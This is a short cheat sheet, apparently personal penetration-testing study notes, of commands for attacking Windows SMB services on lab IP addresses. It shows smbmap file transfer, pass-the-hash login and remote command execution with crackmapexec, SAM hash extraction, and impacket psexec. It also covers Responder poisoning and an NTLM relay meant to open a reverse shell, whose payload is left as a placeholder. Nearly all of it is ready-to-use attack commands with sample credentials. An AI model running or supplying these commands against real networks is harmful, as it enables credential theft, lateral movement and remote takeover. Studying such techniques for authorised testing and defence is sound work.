
Downloading files from share
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Uploading file to share
```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Login to smb with PTH
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Executing commands over smb with crackmapexec
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Extracting SAM Database
```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Connecting to smb with impacket
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Forced auth attack with responder via poisoning
```shell-session
sudo responder -I ens33
```

Passing captured hashes using impacket

```shell-session
Must turn off smb


> cat /etc/responder/Responder.conf | grep 'SMB ='

> impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Establish reverse shell 

> impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c "POWERREVSHELLCODE"
```


